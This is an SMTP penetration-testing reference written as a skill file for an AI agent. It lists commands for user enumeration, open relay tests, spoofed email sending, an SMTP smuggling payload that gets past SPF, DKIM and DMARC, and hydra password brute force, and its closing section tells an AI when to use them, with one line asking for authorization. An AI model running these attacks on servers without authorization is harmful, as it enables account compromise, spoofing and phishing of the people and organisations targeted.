# SMTP Pentesting Skill

## Goal

Enumerate and exploit SMTP (Simple Mail Transfer Protocol) services to gather user information, test for open relays, and potentially send phishing emails.

## Methodology

1. **Discovery**: Identify SMTP services and banner grab
2. **Enumeration**: Enumerate valid users via VRFY, EXPN, RCPT
3. **Open Relay Testing**: Check if server allows relaying
4. **Vulnerability Testing**: Test for known vulnerabilities
5. **SMTP Smuggling**: Bypass email security controls

## Ports

- 25/TCP: SMTP (standard)
- 465/TCP: SMTPS (deprecated, implicit TLS)
- 587/TCP: Submission (STARTTLS)

## Tools

* **nmap**: SMTP scripts
* **smtp-user-enum**: User enumeration
* **swaks**: Swiss Army Knife for SMTP
* **sendEmail**: Command-line email sender
* **Metasploit**: SMTP modules

## Example Commands

```bash
# Nmap SMTP enumeration
nmap -p25,465,587 --script smtp-* target
nmap -p25 --script smtp-commands target
nmap -p25 --script smtp-enum-users target
nmap -p25 --script smtp-open-relay target
nmap -p25 --script smtp-brute target

# Banner grabbing
nc target 25
telnet target 25

# SMTP commands
EHLO attacker.com
MAIL FROM:<test@attacker.com>
RCPT TO:<user@target.com>
DATA
Subject: Test
Test email
.
QUIT
```

## User Enumeration

### VRFY Method

```bash
# Manual VRFY
telnet target 25
VRFY root
VRFY admin
VRFY user

# Using smtp-user-enum
smtp-user-enum -M VRFY -U users.txt -t target
smtp-user-enum -M VRFY -u admin -t target
```

### EXPN Method

```bash
# EXPN expands mailing lists
telnet target 25
EXPN postmaster
EXPN all

smtp-user-enum -M EXPN -U users.txt -t target
```

### RCPT TO Method

```bash
# Most reliable method
telnet target 25
EHLO test
MAIL FROM:<test@test.com>
RCPT TO:<admin@target.com>  # 250 = exists, 550 = doesn't exist

smtp-user-enum -M RCPT -U users.txt -t target -D target.com
smtp-user-enum -M RCPT -U users.txt -t target -D target.com -f attacker@attacker.com
```

## Open Relay Testing

```bash
# Manual test
telnet target 25
EHLO test
MAIL FROM:<sender@external.com>
RCPT TO:<recipient@external.com>  # If accepted = open relay!
DATA
Subject: Relay test
Test
.
QUIT

# Nmap script
nmap -p25 --script smtp-open-relay target

# Using swaks
swaks --to victim@external.com --from attacker@external.com --server target

# Metasploit
use auxiliary/scanner/smtp/smtp_relay
```

## Sending Test Emails

```bash
# Using swaks
swaks --to user@target.com --from attacker@attacker.com --header "Subject: Test" --body "Test body" --server target

# With authentication
swaks --to user@target.com --from attacker@attacker.com --server target --auth LOGIN --auth-user user --auth-password pass

# Using sendEmail
sendEmail -t user@target.com -f attacker@attacker.com -s target -u "Subject" -m "Message body"

# Using telnet (manual)
telnet target 25
EHLO test
MAIL FROM:<attacker@attacker.com>
RCPT TO:<user@target.com>
DATA
Subject: Manual Test
From: attacker@attacker.com
To: user@target.com

Email body here.
.
QUIT
```

## SMTP Smuggling

```bash
# SMTP smuggling bypasses email authentication (SPF, DKIM, DMARC)
# Works when outbound and inbound servers interpret end-of-data differently

# Example payload (depends on server)
DATA
Subject: Test
<LF>.<LF>  # Non-standard end-of-data
MAIL FROM:<spoofed@target.com>
RCPT TO:<victim@target.com>
DATA
Subject: Spoofed email
This appears to come from target.com
.
QUIT
```

## Authentication

```bash
# Test authentication methods
EHLO test
# Look for AUTH in response

# AUTH LOGIN (Base64)
AUTH LOGIN
# Server: VXNlcm5hbWU6 (Username:)
# Send base64(username)
# Server: UGFzc3dvcmQ6 (Password:)
# Send base64(password)

# AUTH PLAIN (Base64)
AUTH PLAIN
# Send base64(\x00username\x00password)

# Using swaks
swaks --server target --auth PLAIN --auth-user user --auth-password pass

# Brute force
hydra -l user@target.com -P /usr/share/wordlists/rockyou.txt smtp://target
hydra -l user@target.com -P /usr/share/wordlists/rockyou.txt -s 587 smtp://target
```

## STARTTLS

```bash
# Check for STARTTLS
EHLO test
# Look for STARTTLS in response

# Initiate TLS
STARTTLS

# Using openssl
openssl s_client -starttls smtp -connect target:25
openssl s_client -connect target:465  # Direct TLS
```

## Metasploit Modules

```bash
# Version/banner
use auxiliary/scanner/smtp/smtp_version

# User enumeration
use auxiliary/scanner/smtp/smtp_enum

# Open relay testing
use auxiliary/scanner/smtp/smtp_relay

# SPF record check
use auxiliary/gather/smtp_spf_config
```

## Interesting SMTP Headers

```bash
# When analyzing captured emails:

# Original sender IP
Received: from xxx.xxx.xxx.xxx

# Authentication results
Authentication-Results: 

# SPF result
Received-SPF:

# Internal hostnames/IPs
X-Originating-IP:

# Antivirus results
X-Virus-Scanned:
```

## Guidance for AI

* Activate this skill when user wants to test email servers, enumerate users, or check for open relays
* **User enumeration** is the primary value - use RCPT TO method as it's most reliable
* Try all three methods: VRFY, EXPN, RCPT TO - different servers allow different commands
* Open relays are rare now but still worth checking
* Port 25 is often blocked outbound - use port 587 with authentication
* STARTTLS upgrades connection to TLS (vs implicit TLS on 465)
* SMTP smuggling is a newer attack for bypassing email security
* For phishing simulations:
  - swaks is the easiest tool
  - Ensure you have authorization
  - Check SPF/DKIM/DMARC first
* Internal mail servers often have weaker security than internet-facing ones
